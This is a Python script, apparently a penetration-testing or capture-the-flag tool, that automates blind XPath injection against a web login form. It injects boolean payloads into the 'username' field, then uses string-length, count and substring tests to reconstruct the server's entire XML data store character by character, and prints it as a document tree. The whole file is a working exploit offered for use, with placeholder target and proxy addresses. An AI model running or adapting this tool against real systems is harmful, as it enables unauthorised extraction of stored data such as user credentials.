#!/usr/bin/env python3
import argparse, requests, signal, string, sys

# variables
args = None
debug = False
schema = ""
URL = "http://IP:PORT/"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
TRUE_COND = "success"
CHARACTERS = string.ascii_letters + string.digits + "{}()_" # string.printable
INDENTATION = (" "*4)
TIMEOUT = 10
PROXY = {"http": "http://IP:8080", "https": "http://IP:8080"}

# Ctrl+C
def handlerCrtlC(sig, frame):
    messages.warning("Exit...", True)
signal.signal(signal.SIGINT, handlerCrtlC)

# color class
class color:
   BLUE = "\033[0;34;48m"
   CYAN = "\033[0;36;48m"
   GREEN = "\033[0;32;48m"   
   YELLOW = "\033[0;33;48m"
   RED = "\033[0;31;48m"
   END = "\033[0;37;0m"

# messages class
class messages:
    def exit_program(exit):
        if exit:
            sys.exit()

    def success(message, exit=False):
        print(color.GREEN + "[i] " + message + color.END)
        messages.exit_program(exit)

    def warning(message, exit=False):
        print(color.YELLOW + "[!] " + message + color.END)
        messages.exit_program(exit)

    def error(message, exit=False):
        print(color.RED + "[x] " + message + color.END)
        messages.exit_program(exit)

# argument parser
def argument_parser():
    global args, base_node, debug

    # argument parser configuration
    parser = argparse.ArgumentParser(
        usage="%(prog)s [-n/--node <node-base>] [-d/--debug]>",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="""examples:
        ./%(prog)s 
        ./%(prog)s --node "/*[1]/*[2]/*[3]"
        ./%(prog)s --debug""",
        epilog=""
    )
    parser.add_argument("-n", "--node", action="store", help="Base node (default \"/*[1]\")", dest="base_node", type=str, default="/*[1]")
    parser.add_argument("-d", "--debug", action="store_true", help="Debug mode ON", dest="debug")
    parser.add_argument("-V", "--version", action="version", version="Version: 0.1 by MrW0l05zyn")

    # reading arguments
    args = parser.parse_args()
    # debug mode
    if args.debug: debug=True    

# XPath injection execution
def xpath_injection_exec(payload):
    try:
        payload = f"invalid' or {payload} and 'x'='x"
        data = {"username": f"{payload}","msg": "msg"}
        res = requests.post(URL, headers=HEADERS, data=data, proxies=PROXY, timeout=TIMEOUT, verify=False)

        if TRUE_COND in res.text:
            return True
        return False
    
    except Exception as e:
        messages.error(str(e), True)

# get data length
def get_data_length(subquery, max_length=50):
    for length in range(1, max_length):
        payload = f"string-length({subquery})={length}"
        if xpath_injection_exec(payload):
            return length
    messages.warning(f"Unable to determine length of {subquery}", True)

# get number child nodes
def get_number_child_nodes(subquery, max_child=20):
    for count in range(max_child):
        payload = f"count({subquery})={count}"
        if xpath_injection_exec(payload):
            return count
    messages.warning(f"Unable to determine number of children nodes of {subquery}", True)

# get data
def get_data(subquery):
    global debug

    data_length = get_data_length(subquery)
    data = ""
    for length in range(data_length):
        for character in CHARACTERS:
            payload = f"substring({subquery},{length+1},1)='{character}'"
            if xpath_injection_exec(payload):
                data += character
                if debug: messages.success(f"Getting {subquery} = {data}")        
                break
    return data

# save schema
def save_schema(part_schema):    
    global debug, schema

    if debug:
        schema+= part_schema + "\n"    
    else:
        print(part_schema)

# XPath injection blind
def xpath_injection_blind(base_node, depth=0):
    # base node
    name = get_data(f'name({base_node})')
    number_child_nodes = get_number_child_nodes(base_node + '/*')
    save_schema(INDENTATION * depth + f"<{name}>")

    # child nodes
    for i in range(number_child_nodes):
        xpath_injection_blind(base_node + f'/*[{i+1}]', depth=depth+1)
    if number_child_nodes == 0:
        data = get_data(base_node)
        save_schema(INDENTATION * (depth+1) + data)

    # close node
    save_schema(INDENTATION * depth + f"</{name}>")

# main
if __name__ == "__main__":
    # argument parser
    argument_parser()
    
    # start script
    print()
    # debug mode
    if debug: print(color.CYAN + "DEBUG MODE ON\n" + color.END)
    # XPath injection blind
    xpath_injection_blind(args.base_node)
    # XML document
    if debug: print(color.CYAN + "\nXML DOCUMENT\n\n" + color.END + schema)